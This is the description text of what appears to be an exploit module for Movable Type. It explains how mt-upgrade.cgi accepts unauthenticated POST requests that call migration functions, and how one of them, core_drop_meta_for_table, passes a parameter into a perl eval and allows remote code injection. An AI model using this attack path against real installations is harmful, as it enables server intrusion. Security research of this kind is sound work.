  DESCRIPTION => "

          This module can be used to execute a payload on MoveableType (MT) that

          exposes a CGI script, mt-upgrade.cgi (usually at /mt/mt-upgrade.cgi),

          that is used during installation and updating of the platform.

          The vulnerability arises due to the following properties:

          1. This script may be invoked remotely without requiring authentication

          to any MT instance.

          2. Through a crafted POST request, it is possible to invoke particular

          database migration functions (i.e. functions that bring the existing

          database up-to-date with an updated codebase) by name and with

          particular parameters.

          3. A particular migration function, core_drop_meta_for_table, allows

          a class parameter to be set which is used directly in a perl eval

          statement, allowing perl code injection.
